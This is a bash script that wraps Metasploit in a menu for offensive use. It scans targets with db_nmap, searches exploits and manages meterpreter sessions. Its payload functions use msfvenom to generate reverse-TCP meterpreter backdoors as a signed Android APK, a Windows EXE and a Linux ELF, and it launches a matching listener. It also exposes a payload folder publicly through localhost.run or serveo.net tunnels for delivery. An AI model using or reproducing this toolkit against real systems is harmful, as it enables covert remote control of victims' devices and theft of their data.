#!/bin/bash



# ══════════════════════════════════════════════════════════════════════════════
# 		META Logic
# ══════════════════════════════════════════════════════════════════════════════


start () {
    local MSF_SESSION="msf"

    info "Starting Metasploit Database..."

    if ! systemctl is-active --quiet postgresql; then
        warn "PostgreSQL not running — starting..."
        sudo systemctl start postgresql
        sleep 1
    fi

    if systemctl is-active --quiet postgresql; then
        info "PostgreSQL running"
    else
        err "Failed to start PostgreSQL"
        read -p "Press [Enter] to continue..."
        return 1
    fi

    info "Initializing msfdb..."
    sudo msfdb init 2>/dev/null

    if tmux has-session -t "$MSF_SESSION" 2>/dev/null; then
        info "Metasploit already running — connecting to existing session..."
        sudo tmux attach-session -t "$MSF_SESSION"
    else
        info "Launching msfconsole..."
        sudo tmux new-session -s "$MSF_SESSION" "msfconsole -q"
    fi

    read -p "Press [Enter] to continue..."
}

scanning () {
    read -rp "$(info "Enter target IP/Subnet: ")" TARGET
    info "Running db_nmap on $TARGET..."
    sudo msfconsole -q -x "db_nmap -sV -T4 --open $TARGET; exit"
    read -p "Press [Enter] to continue..."
}

list_sessions () {
    sudo msfconsole -q -x "sessions -l; exit"
    read -p "Press [Enter] to continue..."
}

interact_session () {
    read -rp "$(info "Session ID: ")" SID
    sudo msfconsole -q -x "sessions -i $SID"
    read -p "Press [Enter] to continue..."
}

kill_session () {
    read -rp "$(info "Session ID to kill: ")" SID
    sudo msfconsole -q -x "sessions -k $SID; exit"
    read -p "Press [Enter] to continue..."
}

exploit () {
    read -rp "$(info "Enter service/CVE to search: ")" QUERY
    sudo msfconsole -q -x "search $QUERY; exit"
    read -p "Press [Enter] to continue..."
}

sessions () {
    sudo msfconsole -q -x "sessions -l; exit"
    read -p "Press [Enter] to continue..."
}

exploition () {
    while true; do
        info "-----Make Choice-----"
        info "1) List Sessions"
        info "2) Session Interact"
        info "3) Kill Session"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) list_sessions ;;
            2) interact_session ;;
            3) kill_session ;;
            0) break ;;
            00) break 2 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}

create_apk () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME

    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -o /tmp/$FNAME.apk

    info "Signing APK..."
    rm -f /tmp/test.keystore 2>/dev/null

    keytool -genkey -v -keystore /tmp/test.keystore \
        -alias testkey -keyalg RSA \
        -keysize 2048 -validity 365 \
        -dname "CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US" \
        -storepass android123 -keypass android123 2>/dev/null

    apksigner sign --ks /tmp/test.keystore \
        --ks-pass pass:android123 \
        --key-pass pass:android123 \
        --out /tmp/$FNAME-signed.apk \
        /tmp/$FNAME.apk

    info "Signed APK saved to /tmp/$FNAME-signed.apk"
    read -p "Press [Enter] to continue..."
}

create_exe () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -f exe -o /tmp/$FNAME.exe
    info "EXE saved to /tmp/$FNAME.exe"
    read -p "Press [Enter] to continue..."
}

create_elf () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    msfvenom -p linux/x86/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -f elf -o /tmp/$FNAME.elf
    info "ELF saved to /tmp/$FNAME.elf"
    read -p "Press [Enter] to continue..."
}

listner () {
    read -rp "$(info "LHOST: ")" LHOST
    read -rp "$(info "LPORT: ")" LPORT
    sudo fuser -k ${LPORT}/tcp 2>/dev/null

    sudo msfconsole -q -x "
        use exploit/multi/handler;
        set payload android/meterpreter/reverse_tcp;
        set LHOST $LHOST;
        set LPORT $LPORT;
        run"
}

payload () {
    while true; do
        info "-----Make Choice-----"
        info "1) Android APK"
        info "2) Windows EXE"
        info "3) Linux ELF"
        info "4) Start Listener"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) create_apk ;;
            2) create_exe ;;
            3) create_elf ;;
            4) listner ;;
            0) break ;;
            00) break 2 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}

server () {
    local venv="/home/$(logname)/.venv"

    if [[ ! -x "$venv/bin/python3" ]]; then
        info "Setting up environment..."
        python3 -m venv "$venv"
        "$venv/bin/pip" install uploadserver -q
    fi

    read -rp "$(info "Full path to share (e.g. /tmp): ")" share

    if [[ ! -d "$share" ]]; then
        err "Folder not found"
        read -p "Press [Enter] to continue..."
        return 1
    fi

    cd "$share" || { err "Could not cd into $share"; return 1; }

    sudo fuser -k 8080/tcp 2>/dev/null

    info "Starting local server on port 8080..."
    "$venv/bin/python3" -m uploadserver 8080 &
    server_pid=$!

    trap 'kill $server_pid 2>/dev/null' EXIT

    sleep 2

    info "Creating tunnel - YOUR URL WILL APPEAR BELOW:"
    echo ""

    if ! ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 \
        -R 80:localhost:8080 localhost.run; then
        err "localhost.run failed, retrying with serveo.net..."
        ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 \
            -R 80:localhost:8080 serveo.net
    fi

    kill $server_pid 2>/dev/null
    trap - EXIT
    cd - > /dev/null
}

# ══════════════════════════════════════════════════════════════════════════════
# META MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

meta_menu () {
    clear
    while true; do
        info "-----Make Choice-----"
        info "1) Start/Connect Database"
        info "2) Open a Server"
        info "3) Network Scan"
        info "4) Search Exploit"
        info "5) Active Sessions"
        info "6) Post Exploitation"
        info "7) Create Payloads"
        info "0) Back"

        read -rp "$(info ">>")" choice

        case $choice in
            1) start ;;
            2) server ;;
            3) scanning ;;
            4) exploit ;;
            5) sessions ;;
            6) exploition
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            7) payload
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            0) break ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}


